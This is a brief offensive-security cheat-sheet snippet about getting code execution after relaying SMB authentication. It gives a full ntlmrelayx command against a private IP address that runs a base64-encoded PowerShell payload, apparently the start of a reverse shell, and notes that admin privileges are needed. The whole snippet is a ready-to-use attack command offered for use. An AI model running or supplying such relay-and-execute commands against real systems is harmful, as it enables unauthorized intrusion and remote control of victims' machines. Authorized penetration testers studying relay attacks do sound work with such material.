- Get a code execution , after relaying smb :
```sh
#need to admin privileges
sudo ntlmrelayx --no-http-server -smb2support -t 192.168.50.212
-c "powershell -enc JABjAGwAaQBlAG4AdA..."
```